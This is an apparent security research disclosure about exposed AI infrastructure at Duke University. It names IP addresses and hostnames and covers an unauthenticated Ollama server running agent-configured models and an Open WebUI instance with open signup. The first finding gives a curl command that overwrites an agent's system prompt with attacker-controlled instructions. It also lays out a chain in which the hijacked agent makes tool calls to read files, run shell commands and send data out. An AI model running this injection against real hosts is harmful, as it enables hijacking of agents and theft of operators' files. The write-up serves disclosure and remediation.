# Duke University: Unauthenticated Agentic Ollama with File Inspection Tools

_NuClide Research · 2026-05-01_

---

## Summary

Duke University server running Ollama with two agent-configured variants of Qwen 3.6-27B, both with system prompts instructing file-inspection behavior and native function-calling enabled. Raw Ollama port publicly accessible. Model injection via CVE-2025-63389 would silently redirect agent behavior on next workflow invocation.

---

## Infrastructure

| Field | Value |
|---|---|
| IP | 152.3.41.179 |
| Org | Duke University |
| Country | US, North Carolina |
| OS | Linux (`/usr/share/ollama/` path) |
| Open ports | 11434 (Ollama, **public**) |

---

## Models

| Model | Size | Notes |
|---|---|---|
| qwen3.6-27b-agent:latest | 16 GB | **Agent, file inspection tools** |
| qwen3.6-27b-agent-128k:latest | 16 GB | **Agent, 128K context, file inspection tools** |
| qwen3.6:27b | 16 GB | Base model |
| hermes3:8b | 4 GB | Local |

---

## Agent Configuration

Both agent models share this system prompt:

```
You are a careful local workflow agent. Prefer using available tools to inspect
files rather than guessing.
Do not overwrite files unless explicitly asked.
```

Modelfile parameters (optimized for deterministic agentic output):
```
RENDERER qwen3.5
PARSER qwen3.5
PARAMETER num_ctx 65536        # 64K context for large file reads
PARAMETER temperature 0.2      # low temperature = consistent tool calls
PARAMETER presence_penalty 1.5
PARAMETER top_k 20
PARAMETER top_p 0.8
```

`RENDERER` and `PARSER` directives enable Ollama's native tool/function-calling. This model is built to generate structured tool-call outputs that an orchestrating framework then executes.

---

## Findings

### F1: Unauthenticated Agent Model Injection (CRITICAL)

Any actor can overwrite the agent system prompt via CVE-2025-63389:

```bash
curl -X POST http://152.3.41.179:11434/api/create \
  -d '{
    "model": "qwen3.6-27b-agent:latest",
    "from": "qwen3.6-27b-agent:latest",
    "system": "[attacker-controlled instructions]"
  }'
```

Next time the operator's workflow invokes this model, it runs under the injected system prompt. If the workflow executes tool calls emitted by the model (file read, shell, API calls), the injected prompt controls what tools are called and with what arguments.

### F2: 128K Context Agent as Exfiltration Vector (HIGH)

The 128K context variant is optimized for processing large files. An attacker-controlled system prompt could instruct the agent to include file contents in its responses, readable by any actor watching the orchestration layer.

---

## Chain

```
CVE-2025-63389 model injection (port 11434, no auth)
  → operator's workflow runs agent under attacker prompt
  → model emits attacker-directed tool calls
  → framework executes: file_read, shell, API → operator's filesystem/environment
```

---

## Remediation

```bash
OLLAMA_HOST=127.0.0.1:11434
systemctl restart ollama
```

---

## Disclosure

- **Discovered:** 2026-05-01
- **Status:** FIXED :)

---

## Second host (2026-05-19 .edu sweep): `vcm-51699.vm.duke.edu`

A second Duke-attributed Open WebUI deployment was observed during the 2026-05-19 .edu LLM-infra survey wave-1. Distinct host from the prior Duke entry; same auth-on-default class with `enable_signup:true`.

### Infrastructure

| Field | Value |
|---|---|
| IP | 67.159.73.73 |
| rDNS | `vcm-51699.vm.duke.edu` (Duke "Virtual Compute Manager" — the institutional VM-on-demand service) |
| Org (WHOIS) | Duke University (`OrgName: Duke University`, `NetName: DUKE-NET2`, CIDR `67.159.64.0/18`) |
| City | Durham, NC |
| Open ports observed | 22 (OpenSSH 8.9p1 Ubuntu 3ubuntu0.15), 3000 (Open WebUI uvicorn) |
| Continuous-exposure history | Shodan tracking shows port 3000 returning "Open WebUI" title continuously from at least 2026-04-30 through 2026-05-07 |

### Observations — Open WebUI v0.7.2

`GET http://vcm-51699.vm.duke.edu:3000/api/config` returned 200 with:

```json
{
  "status": true,
  "name": "Open WebUI",
  "version": "0.7.2",
  "default_locale": "",
  "oauth": {"providers": {"oidc": "Descope"}},
  "features": {
    "auth": true,
    "auth_trusted_header": false,
    "enable_signup_password_confirmation": false,
    "enable_ldap": false,
    "enable_api_keys": false,
    "enable_signup": true,
    "enable_login_form": true,
    "enable_websocket": true,
    "enable_version_update_check": true,
    "enable_public_active_users_count": true
  }
}
```

**Class memberships observed:**
- `enable_signup: true` — public self-registration class OBSERVED
- `oauth.providers.oidc: "Descope"` — Descope (commercial IDP) OIDC backend configured alongside the open signup
- `enable_ldap: false`, `enable_api_keys: false` — neither directory federation nor post-auth API key minting enabled
- `enable_websocket: true`, `enable_public_active_users_count: true` — UI features for live state visibility

### Notable details — Duke VCM hosts

The `vcm-NNNNN.vm.duke.edu` hostname pattern identifies Duke's Virtual Compute Manager — the institutional service that lets faculty/students provision VMs on demand. A `vcm-51699` host indicates this is one of ~52,000+ assigned VM identifiers in that service. The user who provisioned this VM appears to have installed Open WebUI with signup-open + Descope OIDC enabled. The implication: Duke's institutional VCM service makes it trivial to stand up arbitrary services on the public internet — the institutional posture relies on individual VM owners to configure their services correctly.

The earlier Duke case study (above) covered a different host. This is now the second Duke-attributed Open WebUI deployment in the NuClide ledger.

### Cross-tool confirmations

- `aimap -ports-class wide` — surfaced Open WebUI service classification
- `visorbishop` (post-G5 fix) — tool-internal output: `open-webui auth=signup-open severity=critical`
- `visorplus assess 67.159.73.73` — produced full 6-phase assessment: WHOIS (Duke), Shodan host data (port 3000 + 22), GreyNoise (no data), PassiveDNS, SSH keys captured, attempted Ollama enum (port 11434 closed)
- **menlohunt FP**: tool fired CRITICAL "Kubelet /exec — remote execution endpoint exposed" on port 3000. False positive — port 3000 is Open WebUI on this host, not kubelet. Same Insight #16 class as prior MinIO/Next.js misreads. Fixed in G9 post-survey.

### Class-membership summary (no tier labels per survey convention)

- Open WebUI signup-open class — OBSERVED
- OIDC-backend-with-signup-open class — OBSERVED (Descope IDP configured alongside open signup)
- Duke VCM (institutional self-service VM) hosting class — OBSERVED at a second host

Data-membership (specific account creation, specific OIDC flow, specific takeover capability) not tested per restraint ethic.

### Source artifacts

- Workspace: `~/recon/edu-llm-infra-2026-05-19/`
- Initial probe: `arsenal-out/critical-openwebui-results.json` (Duke section)
- VisorPlus deep assess: `~/recon/edu-llm-infra-2026-05-19/67_159_73_73/` (whois, shodan_host.json, ssh_keys.txt, nmap_top1000.txt, greynoise.json, passive_dns.txt)
- visorbishop wave-1 revalidation: `stage2-wave2/arsenal/visorbishop-wave1-revalidate.json` (Duke entry)
- menlohunt output (with the FP): `arsenal-out/menlohunt-duke.json`
